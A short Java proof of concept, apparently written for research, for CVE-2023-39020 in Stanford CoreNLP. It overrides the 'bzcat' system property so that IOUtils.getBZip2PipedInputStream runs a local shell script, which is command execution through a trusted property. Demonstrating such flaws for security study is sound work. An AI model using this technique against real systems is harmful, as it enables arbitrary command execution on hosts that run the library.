package com.anonuser;

import edu.stanford.nlp.io.IOUtils;

public class Stanford_Parser_CVE_2023_39020 {

    public static void main(String[] args) {

        // Executes the command in the create_file.sh script
        System.setProperty("bzcat", "/home/pamusuo/research/permissions-manager/exploit-apps/files/create_file.sh");
        try {
            IOUtils.getBZip2PipedInputStream("");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
